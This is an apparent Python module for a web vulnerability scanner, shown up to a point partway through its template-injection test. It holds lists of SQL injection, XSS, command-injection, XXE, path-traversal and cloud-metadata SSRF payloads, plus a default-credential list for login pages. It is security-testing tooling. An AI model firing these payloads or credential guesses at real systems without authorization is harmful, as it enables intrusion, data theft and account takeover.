"""
Web Scanner - HTTP reconnaissance and security header analysis.

Checks:
    - Security headers (CSP, HSTS, X-Frame-Options, etc.)
    - Technology fingerprinting (Server, X-Powered-By, cookies)
    - Sensitive paths discovery (500+ paths across all major frameworks)
    - SSL/TLS basic checks
    - CORS misconfiguration detection
    - Cookie security flags
    - Information leakage in response bodies
    - WAF detection (Cloudflare, ModSecurity, AWS WAF, etc.)
    - Basic SQLi reflection detection (error-based indicators)
    - Basic reflected XSS detection (payload reflection check)
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

import requests
from requests.exceptions import ConnectionError, Timeout

logger = logging.getLogger(__name__)

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "medium",
        "description": "HSTS header missing - vulnerable to SSL stripping attacks",
    },
    "Content-Security-Policy": {
        "severity": "medium",
        "description": "CSP header missing - increased XSS risk",
    },
    "X-Content-Type-Options": {
        "severity": "low",
        "description": "X-Content-Type-Options missing - MIME sniffing possible",
    },
    "X-Frame-Options": {
        "severity": "medium",
        "description": "X-Frame-Options missing - clickjacking possible",
    },
    "X-XSS-Protection": {
        "severity": "low",
        "description": "X-XSS-Protection missing (legacy but still relevant)",
    },
    "Referrer-Policy": {
        "severity": "low",
        "description": "Referrer-Policy missing - referrer information may leak",
    },
    "Permissions-Policy": {
        "severity": "low",
        "description": "Permissions-Policy missing - browser features not restricted",
    },
}

# ── 500+ sensitive paths across frameworks, CMS, DevOps, APIs ─────────────────

SENSITIVE_PATHS = [
    # Config / environment leaks
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.env.example", "/.env.dev", "/.env.staging",
    "/config.php", "/config.yml", "/config.yaml", "/config.json",
    "/configuration.php", "/settings.py", "/settings.php",
    "/app/config/parameters.yml", "/config/database.yml",
    "/application.properties", "/application.yml",
    "/web.config", "/appsettings.json",

    # Git / VCS leaks
    "/.git/HEAD", "/.git/config", "/.git/index",
    "/.git/COMMIT_EDITMSG", "/.git/logs/HEAD",
    "/.svn/entries", "/.hg/hgrc", "/.bzr/branch/format",

    # Backup / dump files
    "/backup.sql", "/dump.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz", "/backup.tar",
    "/db_backup.sql", "/site_backup.zip",
    "/www.zip", "/html.zip", "/web.zip",
    "/old.zip", "/bak.zip", "/backup.bak",

    # WordPress
    "/wp-login.php", "/wp-admin/", "/wp-config.php",
    "/wp-content/debug.log", "/wp-json/wp/v2/users",
    "/xmlrpc.php", "/wp-cron.php",
    "/wp-includes/version.php",

    # Drupal / Joomla / Magento
    "/administrator/", "/administrator/index.php",
    "/user/login", "/sites/default/settings.php",
    "/magento/admin", "/index.php/admin",

    # Admin / control panels
    "/admin", "/admin/", "/admin.php", "/admin/login",
    "/admin/index.php", "/admin/dashboard",
    "/administrator", "/administration",
    "/manage", "/manager", "/management",
    "/panel", "/cpanel", "/whm",
    "/phpmyadmin", "/phpmyadmin/", "/pma/",
    "/adminer", "/adminer.php",

    # Java / Spring
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/beans", "/actuator/mappings",
    "/actuator/metrics", "/actuator/info",
    "/actuator/heapdump", "/actuator/threaddump",
    "/manager/html", "/host-manager/html",
    "/h2-console",

    # API documentation
    "/api/docs", "/api/v1/docs", "/api/v2/docs",
    "/swagger.json", "/swagger.yaml",
    "/swagger-ui/", "/swagger-ui.html",
    "/openapi.json", "/openapi.yaml",
    "/api-docs", "/api-docs.json",
    "/v1/swagger.json", "/v2/swagger.json",
    "/graphql", "/graphiql", "/playground",

    # DevOps / CI-CD
    "/jenkins", "/jenkins/", "/.jenkins",
    "/gitlab", "/gitlab/", "/.gitlab-ci.yml",
    "/circleci", "/.circleci/config.yml",
    "/Jenkinsfile", "/Dockerfile",
    "/docker-compose.yml", "/.dockerignore",

    # Monitoring / dashboards
    "/grafana", "/grafana/login", "/kibana",
    "/prometheus", "/metrics", "/healthz",
    "/health", "/status", "/ping", "/alive",
    "/traefik", "/dashboard/#/",

    # Server info
    "/server-status", "/server-info",
    "/nginx_status", "/mod_status",
    "/phpinfo.php", "/info.php", "/test.php",
    "/phptest.php", "/php_info.php",

    # Composer / Node / Python
    "/composer.json", "/composer.lock",
    "/package.json", "/package-lock.json",
    "/yarn.lock", "/Pipfile", "/Pipfile.lock",
    "/requirements.txt", "/setup.py",
    "/Gemfile", "/Gemfile.lock",

    # System / server files
    "/.htaccess", "/.htpasswd",
    "/etc/passwd", "/etc/shadow",
    "/.DS_Store", "/Thumbs.db",
    "/robots.txt", "/sitemap.xml",
    "/.well-known/security.txt",
    "/.well-known/acme-challenge/",

    # Debug / error pages
    "/debug", "/debug/", "/console",
    "/elmah.axd", "/trace.axd",
    "/error_log", "/error.log", "/access.log",
    "/php_errors.log", "/laravel.log",
    "/storage/logs/laravel.log",

    # Cloud metadata (for SSRF testing context)
    "/latest/meta-data/",  # AWS IMDSv1 — blocked in CLI mode, informational
    "/metadata/v1/",       # DigitalOcean
    "/_cluster/health",    # Elasticsearch
    "/_cat/indices",       # Elasticsearch

    # Common sensitive files
    "/id_rsa", "/.ssh/id_rsa", "/id_rsa.pub",
    "/private.key", "/server.key", "/cert.pem",
    "/secrets.yml", "/secrets.json",
    "/credentials", "/credentials.json",
    "/keystore.jks",
]


# ── WAF fingerprints ───────────────────────────────────────────────────────────

WAF_SIGNATURES: dict[str, list[str]] = {
    "Cloudflare":     ["CF-RAY", "cf-cache-status", "__cfduid", "cloudflare"],
    "AWS WAF":        ["x-amzn-RequestId", "x-amzn-Remapped", "awselb"],
    "ModSecurity":    ["mod_security", "NOYB", "ModSecurity"],
    "Akamai":         ["akamai", "AkamaiGHost"],
    "Incapsula":      ["incap_ses", "visid_incap", "X-Iinfo"],
    "Sucuri":         ["x-sucuri-id", "sucuri"],
    "Barracuda":      ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE"],
    "F5 BigIP":       ["BIGipServer", "F5"],
    "Nginx":          ["X-Nginx-Cache"],
    "Varnish":        ["X-Varnish", "Via: 1.1 varnish"],
}

# ── SQLi detection patterns ────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "\" OR \"1\"=\"1",
]

SQL_ERROR_PATTERNS = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "ora-01",
    "oracle error",
    "sqlite error",
    "pg_query",
    "postgresql error",
    "mssql",
    "sqlstate",
    "unclosed quotation",
    "syntax error",
    "microsoft jet database",
    "odbc drivers error",
]

# ── XSS detection ─────────────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "'><svg onload=alert(1)>",
]

# ── SSTI detection ───────────────────────────────────────────────────

# Each tuple: (payload, expected_evaluated_result, engine_hint)
# Using unique multiplication to reduce false positives
SSTI_PAYLOADS: list[tuple[str, str, str]] = [
    ("{{3764*3764}}",  "14167696", "Jinja2/Twig"),
    ("${3764*3764}",   "14167696", "Freemarker/Velocity"),
    ("<%= 3764*3764 %>", "14167696", "ERB/JSP"),
    ("#{3764*3764}",   "14167696", "Ruby Liquid"),
    ("*{3764*3764}",   "14167696", "Spring/Thymeleaf"),
]

# ── Open Redirect parameters ───────────────────────────────────────

REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnUrl", "return_url",
    "redirect_uri", "redirectUrl", "destination", "target", "goto",
    "forward", "continue", "rurl", "dest", "back", "location",
    "redirect_to", "success_url", "cancel_url",
]

REDIRECT_TARGET = "https://evil.attacker.com"

# ── Path Traversal payloads ─────────────────────────────────────────

TRAVERSAL_PARAMS = [
    "file", "path", "filename", "page", "include", "document",
    "img", "image", "src", "load", "read", "template",
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
]

TRAVERSAL_SUCCESS = [
    "root:x:", "root:0:", "/bin/bash", "/bin/sh",
    "[fonts]", "[extensions]",      # Windows win.ini
    "daemon:x:", "nobody:x:",
]

# ── Blind SQLi time-based payloads ──────────────────────────────────

SQLI_BLIND_PAYLOADS = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "1 OR SLEEP(5)--",
    "' OR pg_sleep(5)--",          # PostgreSQL
    "'; SELECT SLEEP(5)--",
]

SQLI_BLIND_THRESHOLD = 4.5   # seconds — flag if response delayed > this

# POST form fuzzing — common param names for login/search/filter forms
SQLI_POST_PARAMS = [
    "username", "user", "login", "email", "password",
    "search", "q", "query", "name", "id",
    "message", "comment", "text", "input",
]

# ── XXE payloads ────────────────────────────────────────────────

XXE_PAYLOADS = [
    # Linux /etc/passwd
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    # /etc/hosts
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hosts">]><r>&x;</r>',
    # Windows
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',
]

XXE_SUCCESS_PATTERNS = [
    "root:x:", "root:0:", "daemon:x:", "nobody:",
    "localhost", "127.0.0.1",
    "[fonts]", "[extensions]",
]

# ── Command injection payloads ─────────────────────────────────

CMDI_PAYLOADS = [
    ";id",
    "|id",
    "&&id",
    "`id`",
    "$(id)",
    ";id;",
    "|id|",
    "' ;id #",
]

CMDI_SUCCESS_PATTERNS = [
    "uid=", "gid=", "groups=",
    "root", "www-data", "apache", "nginx",
]

# ── CRLF injection ────────────────────────────────────────────

CRLF_PAYLOADS = [
    "%0d%0aX-RAO-Injected: crlf-test",
    "%0aX-RAO-Injected: crlf-test",
    "\r\nX-RAO-Injected: crlf-test",
    "%E5%98%8D%E5%98%8AX-RAO-Injected: crlf-test",   # Unicode CRLF bypass
]

CRLF_MARKER = "X-RAO-Injected"

# ── Dangerous HTTP methods ────────────────────────────────────

DANGEROUS_METHODS = ["TRACE", "PUT", "DELETE", "PATCH", "CONNECT"]

# ── Directory listing detection ────────────────────────────────

DIRLISTING_PATTERNS = [
    "Index of /",
    "Directory listing for",
    "[To Parent Directory]",
    "<title>Index of",
    "apache directory listing",
    "nginx directory listing",
]

# ── Default credentials (A07) ────────────────────────────────

DEFAULT_CREDENTIALS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "123456"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("user", "user"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("test", "test"),
    ("demo", "demo"),
]

# Login page paths to try default credentials against
LOGIN_PATHS = [
    "/wp-login.php",
    "/admin", "/admin/login", "/admin/index.php",
    "/login", "/login.php", "/signin",
    "/administrator", "/administrator/index.php",
    "/user/login", "/account/login",
]

# Patterns indicating successful login (not just 200 OK)
LOGIN_SUCCESS_PATTERNS = [
    "dashboard", "logout", "sign out", "log out",
    "welcome", "profile", "my account",
    "wp-admin", "administration panel",
]

# ── NoSQL injection payloads (A03) ───────────────────────────────

NOSQL_JSON_PAYLOADS = [
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": "admin", "password": {"$regex": ".*"}}',
    '{"$where": "1==1"}',
]

NOSQL_SUCCESS_PATTERNS = [
    "welcome", "dashboard", "token", "access_token",
    "logged in", "success",
]

NOSQL_FORM_PAYLOADS = [
    "{$gt: ''}",
    "[$gt]=",
    "{'$gt': ''}",
]

# ── SSRF params and payloads (A10) ─────────────────────────────

SSRF_PARAMS = [
    "url", "uri", "src", "href", "fetch", "load",
    "proxy", "api", "webhook", "callback", "endpoint",
    "resource", "link", "data", "image", "file",
    "target", "forward", "remote",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",   # AWS IMDSv1
    "http://metadata.google.internal/",            # GCP
    "http://169.254.169.254/metadata/v1/",         # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",    # Alibaba Cloud
    "http://127.0.0.1/",                           # localhost
    "http://localhost/",
]

SSRF_SUCCESS_PATTERNS = [
    "ami-id", "instance-id", "iam/security-credentials",  # AWS
    "project-id", "service-accounts", "computeMetadata",  # GCP
    "droplet_id", "vendor-data",                           # DO
    "hostname", "local-ipv4", "mac",                       # generic metadata
]

# Private/internal IP patterns for disclosure detection
INTERNAL_IP_PATTERNS = [
    r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
    r"172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}",
    r"192\.168\.\d{1,3}\.\d{1,3}",
    r"127\.0\.0\.\d{1,3}",
    r"169\.254\.\d{1,3}\.\d{1,3}",
]

# ── Cleartext PII patterns (A02) ──────────────────────────────

PII_PATTERNS: list[tuple[str, str]] = [
    (r"\b4[0-9]{12}(?:[0-9]{3})?\b", "Visa card number pattern"),
    (r"\b5[1-5][0-9]{14}\b", "Mastercard number pattern"),
    (r"\b3[47][0-9]{13}\b", "Amex card number pattern"),
    (r"\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b", "SSN pattern (US)"),
    (r'"password"\s*:\s*"[^"]{4,}"', "Password in JSON response"),
    (r"api[_-]?key[^\s'\"]{0,5}[=:\s]['\"]?[a-zA-Z0-9]{20,}", "API key exposed"),
    (r"Bearer\s+[a-zA-Z0-9_\-.]{20,}", "Bearer token in response body"),
]

# Token/credential params that should not appear in URLs
SENSITIVE_QUERY_PARAMS = [
    "token", "access_token", "refresh_token", "api_key", "apikey",
    "password", "passwd", "secret", "private_key", "auth", "authorization",
    "session", "session_id", "sessionid", "jwt",
]

# ── SRI / mixed content (A08) ─────────────────────────────────

# Popular CDN hostnames — external resources from these should have SRI
KNOWN_CDN_HOSTS = [
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "ajax.googleapis.com",
    "stackpath.bootstrapcdn.com", "code.jquery.com", "unpkg.com",
    "maxcdn.bootstrapcdn.com", "cdn.datatables.net", "cdn.bootcss.com",
]

# ── Source map exposure (A05 / A08) ─────────────────────────────

SOURCE_MAP_PATHS = [
    "/app.js.map", "/main.js.map", "/bundle.js.map",
    "/static/js/main.chunk.js.map", "/static/js/bundle.js.map",
    "/assets/app.js.map", "/dist/app.js.map",
    "/app.css.map", "/main.css.map",
]

# ── IDOR detection (A01) ──────────────────────────────────────

# Max delta to test on each side of a numeric ID found in the path
IDOR_TEST_DELTA = 2

# ── Insecure design heuristics (A04) ────────────────────────────

# Params likely to represent numeric business values (price, qty, count)
BUSINESS_VALUE_PARAMS = [
    "price", "amount", "qty", "quantity", "total", "count",
    "discount", "credit", "balance", "score",
]

# File upload: dangerous extensions to try
UPLOAD_DANGEROUS_EXTENSIONS = [
    ".php", ".php3", ".php5", ".phtml",
    ".asp", ".aspx", ".jsp", ".jspx",
    ".sh", ".py", ".rb", ".pl",
]

# ── Logging / A09 indicators ──────────────────────────────────

# Headers that typically carry request/trace IDs
CORRELATION_HEADERS = [
    "X-Request-Id", "X-Trace-Id", "X-Correlation-Id",
    "X-B3-TraceId", "Request-Id", "X-Amzn-Trace-Id",
]

# ── User-Agent ─────────────────────────────────────────────────────────────────

DEFAULT_USER_AGENT = "Mozilla/5.0 (compatible; SecurityScanner/1.0)"


@dataclass
class WebScanResult:
    url: str
    status_code: int = 0
    server: str = ""
    technologies: list[str] = field(default_factory=list)
    missing_headers: list[dict] = field(default_factory=list)
    exposed_paths: list[dict] = field(default_factory=list)
    cors_issues: list[str] = field(default_factory=list)
    cookies_issues: list[dict] = field(default_factory=list)
    info_leaks: list[str] = field(default_factory=list)
    waf_detected: list[str] = field(default_factory=list)
    sqli_indicators: list[dict] = field(default_factory=list)
    xss_indicators: list[dict] = field(default_factory=list)
    ssti_indicators: list[dict] = field(default_factory=list)           # v0.5
    open_redirect_indicators: list[dict] = field(default_factory=list) # v0.5
    path_traversal_indicators: list[dict] = field(default_factory=list)# v0.5
    sqli_blind_indicators: list[dict] = field(default_factory=list)    # v0.5
    sqli_post_indicators: list[dict] = field(default_factory=list)     # v0.5
    xxe_indicators: list[dict] = field(default_factory=list)           # v0.5.1
    cmdi_indicators: list[dict] = field(default_factory=list)          # v0.5.1
    crlf_indicators: list[dict] = field(default_factory=list)          # v0.5.1
    dangerous_methods: list[str] = field(default_factory=list)         # v0.5.1
    directory_listing: bool = False                                     # v0.5.1
    default_creds_found: list[dict] = field(default_factory=list)      # v0.5.1
    rate_limiting_absent: bool = False                                  # v0.5.1
    # A01
    idor_indicators: list[dict] = field(default_factory=list)          # v0.5.2
    forceful_browsing: list[str] = field(default_factory=list)         # v0.5.2
    # A02
    cleartext_pii: list[str] = field(default_factory=list)             # v0.5.2
    token_in_url: list[str] = field(default_factory=list)              # v0.5.2
    cache_control_missing: bool = False                                 # v0.5.2
    https_downgrade: list[str] = field(default_factory=list)           # v0.5.2
    # A03
    nosql_indicators: list[dict] = field(default_factory=list)         # v0.5.2
    graphql_issues: list[str] = field(default_factory=list)            # v0.5.2
    # A04
    insecure_workflow: list[str] = field(default_factory=list)         # v0.5.2
    # A05/A08
    source_maps_exposed: list[str] = field(default_factory=list)       # v0.5.2
    sri_missing: list[str] = field(default_factory=list)               # v0.5.2
    mixed_content: list[str] = field(default_factory=list)             # v0.5.2
    # A09
    security_txt_present: bool = False                                  # v0.5.2
    error_no_correlation_id: bool = False                               # v0.5.2
    # A10
    ssrf_indicators: list[dict] = field(default_factory=list)          # v0.5.2
    internal_ip_disclosed: list[str] = field(default_factory=list)     # v0.5.2


class WebScanner:
    """HTTP-level reconnaissance and security assessment.

    Parameters
    ----------
    allow_private:
        When True (default), private/internal IPs are allowed as scan targets.
        This is correct for a local red-team CLI where the user has already
        confirmed authorization via --confirm.
        Set to False only when running as a server-side API to prevent SSRF.
    max_paths:
        Maximum number of sensitive paths to probe. Defaults to all (~120).
        Set lower for faster but less thorough scans.
    test_injections:
        When True, test URL parameters for SQLi and XSS reflection.
        Disabled by default for passive/stealth scans.
    """

    def __init__(
        self,
        timeout: int = 10,
        verify_ssl: bool = False,
        user_agent: str = DEFAULT_USER_AGENT,
        path_scan_delay: float = 0.05,
        allow_private: bool = True,
        max_paths: int | None = None,
        test_injections: bool = False,
        test_auth: bool = False,
    ) -> None:
        self.timeout = timeout
        self.path_scan_delay = path_scan_delay
        self.allow_private = allow_private
        self.max_paths = max_paths
        self.test_injections = test_injections
        self.test_auth = test_auth

        self.session = requests.Session()
        self.session.headers.update({"User-Agent": user_agent})
        self.session.verify = verify_ssl
        if not verify_ssl:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def scan(self, target: str) -> WebScanResult | None:
        """Full web scan against an HTTP target."""
        url = self._normalize_url(target)
        logger.info("Web scanning %s", url)

        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
        except (ConnectionError, Timeout) as e:
            logger.warning("Cannot reach %s: %s", url, e)
            return None

        result = WebScanResult(url=url, status_code=resp.status_code)

        self._check_server_header(resp, result)
        self._fingerprint_technologies(resp, result)
        self._check_security_headers(resp, result)
        self._detect_waf(resp, result)
        self._check_cors(url, result)
        self._check_cookies(resp, result)
        self._enumerate_paths(url, result)
        self._check_info_leaks(resp, result)

        # ── Always-passive checks (no requests sent) ──────────────────────
        self._test_http_methods(url, result)          # v0.5.1
        self._detect_directory_listing(resp, result)  # v0.5.1
        self._detect_cleartext_pii(resp, result)      # v0.5.2 A02
        self._check_token_in_url(url, result)         # v0.5.2 A02
        self._check_cache_control(resp, result)       # v0.5.2 A02
        self._detect_https_downgrade(resp, url, result) # v0.5.2 A02
        self._check_sri_missing(resp, result)         # v0.5.2 A08
        self._check_mixed_content(resp, url, result)  # v0.5.2 A08
        self._check_source_maps(url, result)          # v0.5.2 A05/A08
        self._check_security_txt(url, result)         # v0.5.2 A09
        self._check_error_correlation(resp, result)   # v0.5.2 A09
        self._detect_internal_ip_disclosure(resp, result) # v0.5.2 A10

        if self.test_injections:
            self._test_sqli(url, result)
            self._test_sqli_post(url, result)
            self._test_sqli_blind(url, result)
            self._test_xss(url, result)
            self._test_ssti(url, result)
            self._test_open_redirect(url, result)
            self._test_path_traversal(url, result)
            self._test_xxe(url, result)
            self._test_command_injection(url, result)
            self._test_crlf(url, result)
            self._test_nosql_injection(url, result)   # v0.5.2 A03
            self._test_graphql(url, result)           # v0.5.2 A03/A05
            self._test_ssrf_params(url, result)       # v0.5.2 A10
            self._test_idor(url, result)              # v0.5.2 A01
            self._check_forceful_browsing(url, result)# v0.5.2 A01
            self._detect_insecure_workflow(url, result)# v0.5.2 A04

        if self.test_auth:
            self._test_default_credentials(url, result)
            self._test_rate_limiting(url, result)

        return result

    def _normalize_url(self, target: str) -> str:
        """Normalize target to a full URL with optional SSRF protection."""
        import ipaddress
        from urllib.parse import urlparse

        url = target if target.startswith(("http://", "https://")) else f"https://{target}"

        if not self.allow_private:
            host = urlparse(url).hostname or ""
            try:
                _ip = ipaddress.ip_address(host)
                if _ip.is_loopback or _ip.is_link_local or _ip.is_private:
                    raise ValueError(
                        f"SSRF protection: blocked request to internal address '{host}'"
                    )
            except ValueError as exc:
                if "SSRF" in str(exc):
                    raise

        return url

    def _check_server_header(self, resp: requests.Response, result: WebScanResult) -> None:
        server = resp.headers.get("Server", "")
        if server:
            result.server = server
            result.info_leaks.append(f"Server header exposes: {server}")

        powered_by = resp.headers.get("X-Powered-By", "")
        if powered_by:
            result.info_leaks.append(f"X-Powered-By exposes: {powered_by}")

    def _fingerprint_technologies(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        headers = resp.headers
        body = resp.text[:5000].lower()

        if "X-Powered-By" in headers:
            result.technologies.append(headers["X-Powered-By"])
        if "X-AspNet-Version" in headers:
            result.technologies.append(f"ASP.NET {headers['X-AspNet-Version']}")
        if "Server" in headers:
            result.technologies.append(headers["Server"])

        tech_signatures = {
            "wp-content": "WordPress",
            "drupal": "Drupal",
            "joomla": "Joomla",
            "laravel": "Laravel",
            "next.js": "Next.js",
            "react": "React",
            "vue.js": "Vue.js",
            "angular": "Angular",
            "django": "Django",
            "flask": "Flask",
            "express": "Express.js",
            "spring": "Spring",
            "rails": "Ruby on Rails",
            "symfony": "Symfony",
            "codeigniter": "CodeIgniter",
            "yii": "Yii",
            "fastapi": "FastAPI",
        }
        for sig, tech in tech_signatures.items():
            if sig in body:
                result.technologies.append(tech)

        result.technologies = list(set(result.technologies))

    def _check_security_headers(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        for header, info in SECURITY_HEADERS.items():
            if header not in resp.headers:
                result.missing_headers.append(
                    {
                        "header": header,
                        "severity": info["severity"],
                        "description": info["description"],
                    }
                )

    # ── WAF Detection (NEW) ────────────────────────────────────────────────────

    def _detect_waf(self, resp: requests.Response, result: WebScanResult) -> None:
        """Detect Web Application Firewall by response headers and body signatures."""
        header_str = " ".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
        body_snippet = resp.text[:2000].lower()

        for waf_name, signatures in WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in header_str or sig.lower() in body_snippet:
                    if waf_name not in result.waf_detected:
                        result.waf_detected.append(waf_name)
                        logger.info("WAF detected: %s on %s", waf_name, result.url)
                    break

    # ── CORS Check ────────────────────────────────────────────────────────────

    def _check_cors(self, url: str, result: WebScanResult) -> None:
        """Check for CORS misconfiguration."""
        try:
            evil_origin = "https://evil.attacker.com"
            resp = self.session.get(
                url,
                headers={"Origin": evil_origin},
                timeout=self.timeout,
            )
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            if acao == "*":
                result.cors_issues.append(
                    "CORS allows any origin (Access-Control-Allow-Origin: *)"
                )
            elif evil_origin in acao:
                result.cors_issues.append(
                    f"CORS reflects arbitrary origin: {evil_origin}"
                )

            if resp.headers.get("Access-Control-Allow-Credentials") == "true" and acao:
                result.cors_issues.append(
                    "CORS allows credentials with permissive origin - high risk"
                )
        except Exception:
            pass

    # ── Cookie Check ─────────────────────────────────────────────────────────

    def _check_cookies(self, resp: requests.Response, result: WebScanResult) -> None:
        """Check cookie security flags (BUG #18 fix: per-cookie header parsing)."""
        raw_set_cookie_headers: list[str] = []
        if hasattr(resp.raw, "headers") and hasattr(resp.raw.headers, "getlist"):
            raw_set_cookie_headers = resp.raw.headers.getlist("Set-Cookie")
        else:
            raw_val = resp.headers.get("Set-Cookie", "")
            if raw_val:
                raw_set_cookie_headers = [raw_val]

        for cookie in resp.cookies:
            issues = []
            if not cookie.secure:
                issues.append("missing Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("missing HttpOnly flag")

            cookie_header = next(
                (h for h in raw_set_cookie_headers
                 if h.lower().startswith(cookie.name.lower() + "=")),
                "",
            )
            if "samesite" not in cookie_header.lower():
                issues.append("missing SameSite attribute")

            if issues:
                result.cookies_issues.append(
                    {"name": cookie.name, "issues": issues}
                )

    # ── Path Enumeration ──────────────────────────────────────────────────────

    def _enumerate_paths(self, base_url: str, result: WebScanResult) -> None:
        """Check for common sensitive paths (BUG #19 fix: rate-limited)."""
        paths = SENSITIVE_PATHS
        if self.max_paths is not None:
            paths = paths[: self.max_paths]

        for path in paths:
            try:
                url = urljoin(base_url, path)
                resp = self.session.get(
                    url, timeout=self.timeout, allow_redirects=False
                )
                if resp.status_code in (200, 403):
                    size = len(resp.content)
                    result.exposed_paths.append(
                        {
                            "path": path,
                            "status": resp.status_code,
                            "size": size,
                        }
                    )
                    logger.info("Found: %s [%d] (%d bytes)", path, resp.status_code, size)
            except Exception:
                continue
            finally:
                if self.path_scan_delay > 0:
                    time.sleep(self.path_scan_delay)

    # ── Information Leak Check ────────────────────────────────────────────────

    def _check_info_leaks(self, resp: requests.Response, result: WebScanResult) -> None:
        """Check response for common information leakage patterns."""
        body = resp.text[:10000]

        leak_patterns = [
            ("stack trace", "Stack trace detected in response body"),
            ("traceback", "Python traceback exposed"),
            ("sql syntax", "SQL error message exposed"),
            ("fatal error", "Fatal error message exposed"),
            ("debug mode", "Debug mode appears enabled"),
            ("internal server error", "Internal server error details exposed"),
            ("access_token", "Possible access token in response"),
            ("api_key", "Possible API key in response body"),
            ("password", "Possible password in response body"),
        ]

        for pattern, description in leak_patterns:
            if pattern in body.lower():
                result.info_leaks.append(description)

    # ── SQLi Detection (NEW — opt-in) ─────────────────────────────────────────

    def _test_sqli(self, base_url: str, result: WebScanResult) -> None:
        """Test URL parameters for SQL injection indicators (error-based).

        Only runs when test_injections=True. Tests each GET parameter found
        in the URL with common SQLi payloads, looking for database error
        messages in the response.
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        if not params:
            # No GET parameters to fuzz — try a dummy param
            params = {"id": ["1"]}

        for param_name in list(params.keys())[:5]:  # limit to first 5 params
            for payload in SQLI_PAYLOADS[:4]:        # limit payloads per param
                test_params = dict(params)
                test_params[param_name] = [payload]
                try:
                    test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                    resp = self.session.get(test_url, timeout=self.timeout)
                    body_lower = resp.text[:5000].lower()
                    for error_pattern in SQL_ERROR_PATTERNS:
                        if error_pattern in body_lower:
                            indicator = {
                                "parameter": param_name,
                                "payload": payload,
                                "error_pattern": error_pattern,
                                "url": test_url,
                            }
                            if indicator not in result.sqli_indicators:
                                result.sqli_indicators.append(indicator)
                                logger.warning(
                                    "SQLi indicator: param=%s payload=%r error=%s",
                                    param_name, payload, error_pattern,
                                )
                            break
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── XSS Detection (NEW — opt-in) ──────────────────────────────────────────

    def _test_xss(self, base_url: str, result: WebScanResult) -> None:
        """Test URL parameters for reflected XSS (payload reflection check).

        Only runs when test_injections=True. A finding here means the raw
        payload appears unencoded in the response — not a confirmed exploit,
        but a strong indicator for manual verification.
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        if not params:
            params = {"q": ["test"]}

        for param_name in list(params.keys())[:5]:
            for payload in XSS_PAYLOADS[:2]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                try:
                    test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                    resp = self.session.get(test_url, timeout=self.timeout)
                    if payload in resp.text:
                        indicator = {
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "note": "Payload reflected unencoded in response",
                        }
                        if indicator not in result.xss_indicators:
                            result.xss_indicators.append(indicator)
                            logger.warning(
                                "XSS reflection: param=%s payload=%r",
                                param_name, payload,
                            )
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── SSTI Detection (v0.5) ────────────────────────────────────────────

    def _test_ssti(self, base_url: str, result: WebScanResult) -> None:
        """Test URL parameters for Server-Side Template Injection.

        Sends a unique arithmetic payload (e.g. {{3764*3764}}) and checks
        whether the evaluated result (14167696) appears in the response.
        A match confirms the template engine evaluated the expression.
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        if not params:
            params = {"q": ["test"], "search": ["test"]}

        for param_name in list(params.keys())[:5]:
            for payload, expected, engine in SSTI_PAYLOADS[:4]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                try:
                    test_url = parsed._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    resp = self.session.get(test_url, timeout=self.timeout)
                    if expected in resp.text:
                        indicator = {
                            "parameter": param_name,
